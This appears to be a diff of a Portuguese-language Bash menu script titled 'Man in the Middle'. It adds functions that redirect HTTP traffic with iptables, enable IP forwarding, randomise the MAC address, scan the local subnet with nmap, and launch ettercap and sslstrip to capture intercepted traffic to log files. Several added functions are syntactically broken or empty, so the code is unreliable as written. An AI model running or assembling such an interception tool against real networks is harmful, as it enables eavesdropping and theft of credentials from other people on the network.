@@ -44,8 +44,7 @@ display=$( dialog --stdout --menu 'Man in The Middle'  0 0 0 \
 read -p "Digite uma opção: " opt
 
 case $display in
-        1) ifconfig | less
-                ;;
+        1) listarPlacasdeRede ;;
   
         2) #echo "Regras atuais: "
         regras=$(iptables -t nat -L)
@@ -153,7 +152,7 @@ case $display in
         dialog --title 'Saindo' --infobox 'Saindo em 3 segundos' 0 0           
                 sleep 3
                 exit 0
-                ;
+                ;;
    
         *) echo "Opção Invalida!"
 
@@ -163,11 +162,75 @@ esac
 #fi
 #}
 
+
+listarPlacasdeRede {
+       ifconfig | less
+
+
+}
+verRegrasdoIptables {
+        iptables -t nat -L
+
+}
+limparRegrasdoIptables{
+        iptables -t nat -F
+}
+adicionarRegrasnoIptables{
+        
+}
+
+mudarMacAddress{
+        macchanger -r wlp2s0 
+}
+iniciarRegras {
+        # criando regras no iptables
+        iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000        # CRIAR OS IFs AQUI
+        
+        # ativando ip forward
+        echo 1 > /proc/sys/net/ipv4/ip_forward  
+
+}
+identificarHosts{
+        nmap -Pn -T 3 192.168.1.0/24 > hosts.txt 
+        egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' hosts.txt | awk '{print $5}' | less 
+}
+iniciarSniffer {
+        # salvando em ...
+        ettercap -G &
+
+        killall -TERM sslstripe
+                xfce4-terminal -e sslstrip -w $PREFIX/cap$DATA.log
+                tail -f $PREFIX/$ARQUIVO | tee mitm_output.txt
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 while true
 do
-        USER=$(whoami)
+        USER=$(id -u)
         
-        if [ $USER = root ]
+        if [ $USER -eq 0 ]
         then    
                 dialog --title "Man in the Middle" \
  --msgbox "O autor do script não se responsabiliza por qualquer ato feito com má fé \
